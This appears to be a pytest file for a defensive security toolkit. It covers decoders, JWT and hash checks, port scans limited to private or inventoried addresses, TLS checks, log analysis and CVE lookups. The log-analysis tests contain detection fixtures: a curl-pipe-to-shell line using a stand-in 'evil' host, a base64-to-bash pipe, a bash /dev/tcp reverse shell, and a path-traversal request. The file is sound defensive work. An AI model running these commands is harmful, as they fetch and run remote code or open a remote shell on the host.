from __future__ import annotations

import base64
import json
import time
import zlib

import httpx
import pytest

from bagley.config import ServerConfig
from bagley.store import Store
from bagley.tools import ToolContext, ToolError
from bagley.tools import security as sec

pytestmark = pytest.mark.anyio


@pytest.fixture
def store() -> Store:
    s = Store(":memory:")
    yield s
    s.close()


def ctx_with(store: Store, transport: httpx.MockTransport | None = None) -> ToolContext:
    config = ServerConfig(data_dir=":memory:", workspace="/tmp")
    http = httpx.AsyncClient(transport=transport) if transport else httpx.AsyncClient()
    return ToolContext(config=config, store=store, http=http)


# Decoding ---------------------------------------------------------------------------------------


def test_decode_single_encodings():
    assert sec.decode.func("SGVsbG8=", "base64")["result"] == "Hello"
    assert sec.decode.func("48656c6c6f", "hex")["result"] == "Hello"
    assert sec.decode.func("a%20b%26c", "url")["result"] == "a b&c"
    assert sec.decode.func("a &amp; b &lt;c&gt;", "html")["result"] == "a & b <c>"
    assert sec.decode.func("uryyb", "rot13")["result"] == "hello"
    assert sec.decode.func("Hello=20World=21", "quoted-printable")["result"] == "Hello World!"


def test_decode_auto_layers_report_each_step():
    inner = base64.b64encode(zlib.compress(b'{"user":"root"}')).decode()
    payload = base64.b64encode(inner.encode()).decode()
    result = sec.decode.func(payload, "auto")
    assert result["steps"] == ["base64", "base64+gzip/zlib"]
    assert result["result"] == '{"user":"root"}'
    assert result["layers"] == 2


def test_decode_auto_detects_url_then_base64():
    result = sec.decode.func("%53%47%56%73%62%47%38%3d", "auto")
    assert result["steps"][0] == "url"
    assert result["result"] == "Hello"


def test_decode_plain_text_is_left_alone():
    result = sec.decode.func("just some words here", "auto")
    assert result["steps"] == [] and "plain text" in result["note"]


def test_decode_caps_and_rejects_bad_input():
    with pytest.raises(ToolError, match="nothing to decode"):
        sec.decode.func("   ", "auto")
    with pytest.raises(ToolError, match="Not valid base64"):
        sec.decode.func("!!!!not base64!!!!", "base64")
    with pytest.raises(ToolError, match="Unknown encoding"):
        sec.decode.func("x", "morse")


def test_decode_gzip_in_base64_explicit():
    blob = base64.b64encode(zlib.compress(b"compressed secret")).decode()
    assert sec.decode.func(blob, "gzip")["result"] == "compressed secret"


# JWT --------------------------------------------------------------------------------------------


def _jwt(header: dict, payload: dict, sig: str = "sig") -> str:
    def part(obj: dict) -> str:
        raw = json.dumps(obj).encode()
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    return f"{part(header)}.{part(payload)}.{sig}"


def test_jwt_flags_alg_none_and_expiry():
    token = _jwt({"alg": "none", "typ": "JWT"}, {"sub": "1", "exp": 1000}, sig="")
    result = sec.decode.func(token, "auto")
    jwt = result["detail"][0]
    assert jwt["encoding"] == "jwt"
    data = jwt["result"]
    assert data["header"]["alg"] == "none"
    assert data["signature_verified"] is False
    assert any("alg is 'none'" in f for f in data["flags"])
    assert any("expired" in f for f in data["flags"])


def test_jwt_valid_future_token_has_no_expiry_flag():
    token = _jwt({"alg": "HS256"}, {"sub": "7", "exp": int(time.time()) + 86400})
    data = sec.decode_jwt(token)
    assert data["header"]["alg"] == "HS256"
    assert data["signature_present"] is True
    assert not any("expired" in f for f in data["flags"])


def test_jwt_rejects_malformed():
    with pytest.raises(ToolError):
        sec.decode_jwt("only.two")


# Hashes -----------------------------------------------------------------------------------------


def test_identify_hash_by_length_and_prefix():
    md5 = sec.identify_hash.func("d41d8cd98f00b204e9800998ecf8427e")
    names = [c["name"] for c in md5["candidates"]]
    assert names[0] == "MD5" and "NTLM" in names
    assert any(c["name"] == "MD5" and c["hashcat_mode"] == 0 for c in md5["candidates"])

    sha256 = sec.identify_hash.func("a" * 64)
    assert sha256["candidates"][0]["name"] == "SHA-256"
    assert sha256["candidates"][0]["hashcat_mode"] == 1400

    sha1 = sec.identify_hash.func("a" * 40)
    assert sha1["candidates"][0]["name"] == "SHA-1"


def test_identify_hash_prefixed():
    assert sec.identify_hash.func("$2b$12$" + "a" * 53)["candidates"][0] == {
        "name": "bcrypt",
        "hashcat_mode": 3200,
        "note": "",
    }
    assert sec.identify_hash.func("$6$salt$rest")["candidates"][0]["hashcat_mode"] == 1800
    assert (
        sec.identify_hash.func("$argon2id$v=19$m=65536,t=3,p=4$abc$def")["candidates"][0]["name"]
        == "Argon2id"
    )
    assert sec.identify_hash.func("$y$j9T$salt$hash")["candidates"][0]["name"] == "yescrypt"


def test_identify_hash_unknown():
    out = sec.identify_hash.func("xyz")
    assert out["candidates"] == [] and out["notes"]
    with pytest.raises(ToolError):
        sec.identify_hash.func("")


# Ports ------------------------------------------------------------------------------------------


def test_explain_port_table():
    ssh = sec.explain_port.func(22)
    assert ssh["service"] == "ssh" and "patch" in ssh["hardening"].lower()
    assert sec.explain_port.func(3389)["service"] == "rdp"
    unknown = sec.explain_port.func(50505)
    assert unknown["service"] == "unknown" and "dynamic range" in unknown["risk"]
    assert len(sec.PORTS) >= 100
    with pytest.raises(ToolError):
        sec.explain_port.func(70000)


def test_parse_ports():
    assert len(sec.parse_ports("top100")) == 100
    assert sec.parse_ports("22,80,8000-8002") == [22, 80, 8000, 8001, 8002]
    assert len(sec.parse_ports("all-known")) > 100
    with pytest.raises(ToolError, match="at most"):
        sec.parse_ports("1-5000")
    with pytest.raises(ToolError):
        sec.parse_ports("nonsense")


# Scan target authorisation ----------------------------------------------------------------------


def test_scannable_ranges():
    assert sec.is_scannable(["192.168.1.1"])
    assert sec.is_scannable(["10.0.0.5"])
    assert sec.is_scannable(["172.16.9.9"])
    assert sec.is_scannable(["127.0.0.1"])
    assert sec.is_scannable(["169.254.1.1"])
    assert sec.is_scannable(["100.100.50.1"])  # Tailscale CGNAT 100.64.0.0/10.
    assert not sec.is_scannable(["8.8.8.8"])
    assert not sec.is_scannable(["100.200.1.1"])  # Outside CGNAT, a public address.
    assert not sec.is_scannable(["192.168.1.1", "8.8.8.8"])  # All must be private.


async def test_scan_refuses_public_address(store):
    ctx = ctx_with(store)
    with pytest.raises(ToolError, match="own network"):
        await sec.scan_ports.func(ctx, "8.8.8.8", "22")


async def test_scan_allows_private_address(store, monkeypatch):
    seen = []

    async def fake_probe(host, port, timeout):
        seen.append((host, port))
        return port == 22

    monkeypatch.setattr(sec, "_probe_port", fake_probe)
    ctx = ctx_with(store)
    result = await sec.scan_ports.func(ctx, "192.168.1.50", "22,80")
    assert result["address"] == "192.168.1.50"
    assert [p["port"] for p in result["open_ports"]] == [22]
    assert result["open_ports"][0]["service"] == "ssh"
    assert {p for _, p in seen} == {22, 80}


async def test_scan_allows_public_address_in_inventory(store, monkeypatch):
    from bagley import work

    work.add_asset(
        store, {"client": "Acme", "name": "edge", "kind": "firewall", "ip": "203.0.113.9"}
    )

    async def fake_probe(host, port, timeout):
        return False

    monkeypatch.setattr(sec, "_probe_port", fake_probe)
    ctx = ctx_with(store)
    result = await sec.scan_ports.func(ctx, "203.0.113.9", "443")
    assert result["host"] == "203.0.113.9" and result["scanned"] == 1


async def test_scan_tailscale_cgnat_allowed(store, monkeypatch):
    async def fake_probe(host, port, timeout):
        return port == 22

    monkeypatch.setattr(sec, "_probe_port", fake_probe)
    ctx = ctx_with(store)
    result = await sec.scan_ports.func(ctx, "100.101.102.103", "22")
    assert [p["port"] for p in result["open_ports"]] == [22]


# TLS --------------------------------------------------------------------------------------------


def test_hostname_matches():
    assert sec.work.hostname_matches("www.example.com", ["www.example.com"])
    assert sec.work.hostname_matches("a.example.com", ["*.example.com"])
    assert not sec.work.hostname_matches("example.com", ["*.example.com"])
    assert not sec.work.hostname_matches("evil.com", ["www.example.com"])


# A real self-signed cert (CN=example.test, SANs example.test/www.example.test/10.0.0.9).
SELF_SIGNED_DER = base64.b64decode(
    "MIIDiDCCAnCgAwIBAgIUJNERmxdmLvSx1pp2Uj5iKyy5jcgwDQYJKoZIhvcNAQELBQAwOjEVMBMGA1UEAwwMZXhhbXBsZS50ZXN0"
    "MRQwEgYDVQQKDAtCYWdsZXkgVGVzdDELMAkGA1UEBhMCRlIwHhcNMjYxMDA4MDExMTI5WhcNMjcxMDA4MDExMTI5WjA6MRUwEwYD"
    "VQQDDAxleGFtcGxlLnRlc3QxFDASBgNVBAoMC0JhZ2xleSBUZXN0MQswCQYDVQQGEwJGUjCCASIwDQYJKoZIhvcNAQEBBQADggEP"
    "ADCCAQoCggEBAJWFxGMx+qdFrdFc3T3ogQFywGh0obHJWVf4pMjhEgQ19GKE5n/a+UcqAlP5h5UHYSZHcDxG0t8VApyJmD/gjEIE"
    "EhdLUuOdfQaGy98lpEeUBtsrkAYUahcOgDrWAjzFY86HLi84rRvL2YwGxjbKpV0wnnvh3+M3Oen+EBIBHOrZaz3Y9iJclUscOL+x"
    "Ez5rkBmH0ocqqfrU8KYvod0L9S9qHk7AqyzJmL5kPpywiupGqp/+4gyE3BpwD1l3vGxDRSI98aG2SHpsrToLw3dsUhHFUOGMM7v+"
    "wG4FvouGvF8FrjApT4BmSR+Wige/j9xQj2bGSYpNOII6Fd0Hbnl7cGcCAwEAAaOBhTCBgjAdBgNVHQ4EFgQUaqb+YeMOGNdh/eDd"
    "JrGNMOjdeqwwHwYDVR0jBBgwFoAUaqb+YeMOGNdh/eDdJrGNMOjdeqwwDwYDVR0TAQH/BAUwAwEB/zAvBgNVHREEKDAmggxleGFt"
    "cGxlLnRlc3SCEHd3dy5leGFtcGxlLnRlc3SHBAoAAAkwDQYJKoZIhvcNAQELBQADggEBABO3NBHe86XDYn9WcDs5IJ56pt6DIsUG"
    "sZl/fth4R36O92/pxfrlLYTM4r6dByHrpzNvoK/l5MgA0WhMQ0JnBs+cXM8NnXvuNCCyk1tFT10uPt5QmPdscbj8rEjq4h8+2W6k"
    "8beV9/VA4itFpJGrZOVkEY1If44CzkOpUadVESLXbaxE7XV4rMr0IuAf6OJo/0EHmuRY1kzP/quk52eHOZ+5M9bFnsDg5o+iWwNB"
    "aatkJjITJrKG5mY/8Mtg4HDJ300eNR6axO3zU4k9MHj1VGkPrs4G+KXrDnOzYCO+UeEW5mX+9DYIcJ7gGZyGNFKDk5Q2G9Vl5Now"
    "o06R7xVko40="
)


def test_parse_certificate_real_der():
    info = sec.work.parse_certificate(SELF_SIGNED_DER)
    assert info["subject"]["CN"] == "example.test"
    assert info["subject"]["O"] == "Bagley Test"
    assert info["issuer"]["CN"] == "example.test"
    assert info["san"] == ["example.test", "www.example.test", "10.0.0.9"]
    assert info["not_before"].year == 2026 and info["not_after"].year == 2027


async def test_tls_check_reports_findings(store, monkeypatch):
    async def fake_probe(host, port, *, address=None, timeout=5.0):
        return {
            "subject": {"CN": "example.com"},
            "issuer": {"O": "Test CA"},
            "san": ["example.com", "www.example.com"],
            "not_before": "2026-01-01T00:00:00+00:00",
            "not_after": "2026-01-10T00:00:00+00:00",
            "days_left": -5,
            "expired": True,
            "protocol": "TLSv1.3",
            "cipher": {"name": "TLS_AES_256_GCM_SHA384", "bits": 256},
            "hostname_match": True,
            "trusted": False,
            "verify_error": "certificate has expired",
        }

    monkeypatch.setattr(sec.work, "tls_probe", fake_probe)
    ctx = ctx_with(store)
    result = await sec.tls_check.func(ctx, "example.com")
    assert result["expired"] is True
    assert any("expired" in f for f in result["findings"])
    assert any("not trusted" in f for f in result["findings"])


async def test_tls_check_refuses_private_not_in_inventory(store):
    ctx = ctx_with(store)
    with pytest.raises(ToolError, match="asset inventory"):
        await sec.tls_check.func(ctx, "192.168.1.1")


# Log analysis -----------------------------------------------------------------------------------


def test_analyze_auth_log_bruteforce():
    lines = [
        f"Jan  1 00:00:0{i} host sshd[1]: Failed password for invalid user admin "
        f"from 198.51.100.9 port 2222 ssh2"
        for i in range(12)
    ]
    lines.append(
        "Jan  1 00:01:00 host sshd[1]: Accepted password for bob from 10.0.0.2 port 5 ssh2"
    )
    result = sec.analyze_log.func("\n".join(lines), "auth")
    assert result["kind"] == "auth"
    assert result["failed_auth"]["total"] == 12
    assert result["failed_auth"]["successful_auth"] == 1
    assert result["failed_auth"]["top_sources"][0]["value"] == "198.51.100.9"
    assert result["failed_auth"]["targeted_users"][0]["value"] == "admin"
    assert any("guessing" in h for h in result["hints"])


def test_analyze_web_log_scanner_and_status():
    lines = [
        '203.0.113.5 - - [01/Jan/2026:00:00:01 +0000] "GET /../../etc/passwd HTTP/1.1" 404 10 '
        '"-" "sqlmap/1.7-dev"',
        '203.0.113.5 - - [01/Jan/2026:00:00:02 +0000] "GET /index.html HTTP/1.1" 200 512 '
        '"-" "Mozilla/5.0"',
        '203.0.113.5 - - [01/Jan/2026:00:00:03 +0000] "GET /admin HTTP/1.1" 500 0 "-" "nikto/2.5"',
    ]
    result = sec.analyze_log.func("\n".join(lines), "auto")
    assert result["kind"] == "web"
    assert result["http"]["requests"] == 3
    scanners = {r["value"] for r in result["http"]["scanner_user_agents"]}
    assert {"sqlmap", "nikto"} <= scanners
    assert result["http"]["status_classes"]["4xx"] == 1
    assert any(p["pattern"] == "path traversal" for p in result["suspicious"])


def test_analyze_log_suspicious_commands():
    text = (
        "user ran: curl http://evil/x | sh\n"
        "echo cABA | base64 -d | bash\n"
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
    )
    result = sec.analyze_log.func(text, "generic")
    patterns = {p["pattern"] for p in result["suspicious"]}
    assert "pipe to shell" in patterns
    assert "base64 decode" in patterns
    assert "/dev/tcp redirect" in patterns


def test_analyze_log_rejects_empty_and_bad_kind():
    with pytest.raises(ToolError):
        sec.analyze_log.func("", "auto")
    with pytest.raises(ToolError, match="kind must be"):
        sec.analyze_log.func("x", "nope")


# CVE lookup -------------------------------------------------------------------------------------

NVD_SAMPLE = {
    "vulnerabilities": [
        {
            "cve": {
                "id": "CVE-2024-3094",
                "published": "2024-03-29T00:00:00",
                "lastModified": "2024-04-10T00:00:00",
                "vulnStatus": "Analyzed",
                "descriptions": [
                    {"lang": "en", "value": "Malicious code in xz/liblzma backdoor."},
                    {"lang": "es", "value": "ignored"},
                ],
                "metrics": {
                    "cvssMetricV31": [
                        {
                            "type": "Primary",
                            "cvssData": {
                                "baseScore": 10.0,
                                "baseSeverity": "CRITICAL",
                                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            },
                        }
                    ]
                },
                "weaknesses": [
                    {"description": [{"value": "CWE-506"}]},
                ],
                "configurations": [
                    {
                        "nodes": [
                            {
                                "cpeMatch": [
                                    {
                                        "vulnerable": True,
                                        "criteria": "cpe:2.3:a:tukaani:xz:5.6.0:*:*:*:*:*:*:*",
                                    },
                                    {
                                        "vulnerable": True,
                                        "criteria": "cpe:2.3:a:tukaani:xz:5.6.1:*:*:*:*:*:*:*",
                                    },
                                ]
                            }
                        ]
                    }
                ],
                "references": [{"url": f"https://ref/{i}"} for i in range(12)],
                "cisaExploitAdd": "2024-03-30",
                "cisaActionDue": "2024-04-05",
                "cisaVulnerabilityName": "xz backdoor",
            }
        }
    ]
}

CIRCL_SAMPLE = {
    "cveMetadata": {
        "cveId": "CVE-2021-44228",
        "datePublished": "2021-12-10",
        "dateUpdated": "2021-12-14",
    },
    "containers": {
        "cna": {
            "descriptions": [
                {"lang": "en", "value": "Log4j JNDI remote code execution (Log4Shell)."}
            ],
            "metrics": [
                {
                    "cvssV3_1": {
                        "baseScore": 10.0,
                        "baseSeverity": "CRITICAL",
                        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                    }
                }
            ],
            "problemTypes": [{"descriptions": [{"cweId": "CWE-502"}]}],
            "references": [{"url": "https://logging.apache.org/"}],
            "affected": [{"vendor": "Apache", "product": "Log4j"}],
        }
    },
}


def cve_transport(nvd_status: int = 200, circl_status: int = 200):
    def handler(request: httpx.Request) -> httpx.Response:
        host = request.url.host
        if host == "services.nvd.nist.gov":
            if nvd_status != 200:
                return httpx.Response(nvd_status, json={"message": "nope"})
            return httpx.Response(200, json=NVD_SAMPLE)
        if host == "cve.circl.lu":
            if circl_status != 200:
                return httpx.Response(circl_status)
            return httpx.Response(200, json=CIRCL_SAMPLE)
        return httpx.Response(404)

    return httpx.MockTransport(handler)


async def test_cve_lookup_nvd_and_cache(store):
    transport = cve_transport()
    calls = {"n": 0}
    real = transport.handler

    def counting(request):
        calls["n"] += 1
        return real(request)

    ctx = ctx_with(store, httpx.MockTransport(counting))
    out = await sec.cve_lookup.func(ctx, "cve-2024-3094")
    assert out["id"] == "CVE-2024-3094"
    assert out["cvss"]["base_score"] == 10.0 and out["cvss"]["severity"] == "CRITICAL"
    assert out["cvss"]["version"] == "3.1"
    assert out["cwe"] == ["CWE-506"]
    assert out["cisa_kev"] is True
    assert len(out["references"]) == 8  # Capped at 8.
    assert out["affected"]["products"] == ["tukaani xz"]
    assert out["affected"]["match_count"] == 2
    assert out["cached"] is False
    first_calls = calls["n"]

    again = await sec.cve_lookup.func(ctx, "CVE-2024-3094")
    assert again["cached"] is True
    assert calls["n"] == first_calls  # Served from the cache, no new request.


async def test_cve_lookup_falls_back_to_circl(store):
    ctx = ctx_with(store, cve_transport(nvd_status=503))
    out = await sec.cve_lookup.func(ctx, "CVE-2021-44228")
    assert out["source"] == "CIRCL"
    assert out["id"] == "CVE-2021-44228"
    assert out["cvss"]["base_score"] == 10.0
    assert out["cwe"] == ["CWE-502"]
    assert "Log4Shell" in out["description"]


async def test_cve_lookup_both_fail(store):
    ctx = ctx_with(store, cve_transport(nvd_status=500, circl_status=404))
    with pytest.raises(ToolError, match="Couldn't look up"):
        await sec.cve_lookup.func(ctx, "CVE-2000-0001")


async def test_cve_lookup_validates_id(store):
    ctx = ctx_with(store, cve_transport())
    with pytest.raises(ToolError, match="CVE id"):
        await sec.cve_lookup.func(ctx, "not-a-cve")
